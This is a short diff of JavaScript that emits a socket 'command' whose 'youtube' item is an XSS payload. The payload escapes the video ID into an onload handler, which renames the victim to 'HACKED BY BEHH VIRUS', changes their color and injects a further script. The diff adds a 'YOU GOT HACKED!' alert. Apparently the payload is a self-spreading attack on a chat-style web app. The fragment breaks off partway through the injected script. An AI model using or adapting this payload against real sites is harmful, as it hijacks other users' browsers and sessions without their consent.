@@ -2,6 +2,7 @@ socket.emit('command', {
   list: [
     "youtube",
     "FveF-we6lcE\" onload=\" \socket.emit('command',{list:['name','HACKED BY BEHH VIRUS']});\
+      alert('YOU GOT HACKED! YOUR PUNISHMENT IS.. BEHH!'); \
     socket.emit('command',{list:['color','blue']});\
       var s=document.createElement('script'); \
       s.textContent = `(function(){ \
